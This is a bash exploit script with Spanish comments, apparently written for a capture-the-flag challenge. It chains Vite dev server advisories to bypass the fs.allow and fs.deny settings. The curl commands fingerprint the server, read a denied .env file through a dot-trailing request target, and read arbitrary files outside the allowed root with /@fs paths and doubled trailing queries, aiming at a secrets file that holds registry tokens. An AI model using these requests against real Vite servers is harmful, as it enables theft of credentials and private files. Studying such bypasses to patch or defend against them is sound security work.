#!/bin/bash
# Works On My Machine (Fluid Attacks CTF 2026) -- Vite dev server fs.allow/fs.deny bypass.
# Uso:    ./vite_fs_deny_bypass.sh <base_url> [abs_path_fuera_del_allow]
# Ejemplo: ./vite_fs_deny_bypass.sh https://bc32a8a17cae5c31.chal.ctf.ae /opt/vitrina/keystore/deploy.secrets
#
# Cadena de dos advisories:
#   GHSA-859w-5945-r5v3  -> archivos DENEGADOS bajo el root: dot-trailing con --request-target /.env/.
#   GHSA-v2wj-q39q-566r  -> fs.deny "bypassed with queries": ?raw / ?import&raw
#   CVE-2025-30208 / CVE-2025-46565
# Para archivos FUERA del allow (/opt...), /@fs/<abs>?import&raw?? (query trailing doble evade rawRE/urlRE).

BASE="${1:-https://bc32a8a17cae5c31.chal.ctf.ae}"
TARGET_ABS="${2:-/opt/vitrina/keystore/deploy.secrets}"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"

echo "[*] 1) Fingerprint Vite + leer vite.config.js (fs.allow / fs.deny)"
curl -sk -A "$UA" "$BASE/@vite/client" -o /dev/null -w '   /@vite/client -> %{http_code}\n'
curl -sk -A "$UA" "$BASE/vite.config.js"; echo

echo "[*] 2) Leer archivo denegado BAJO el root (.env) con dot-trailing (--request-target)"
curl -sk -A "$UA" --request-target "/.env/." "$BASE" ; echo
#   -> revela p.ej. YURUMI_SECRET_STORE=/opt/vitrina/keystore/deploy.secrets

echo "[*] 3) Leer archivo FUERA del allow con /@fs + query trailing doble"
curl -sk -A "$UA" "$BASE/@fs${TARGET_ABS}?import&raw??" ; echo
#   -> "export default \"...REGISTRY_TOKEN=FLAG{...}\"" (Vite lo sirve como modulo con el crudo)

echo "[*] (fallback) variante ?raw?? por si ?import&raw?? no aplica"
curl -sk -A "$UA" "$BASE/@fs${TARGET_ABS}?raw??" ; echo
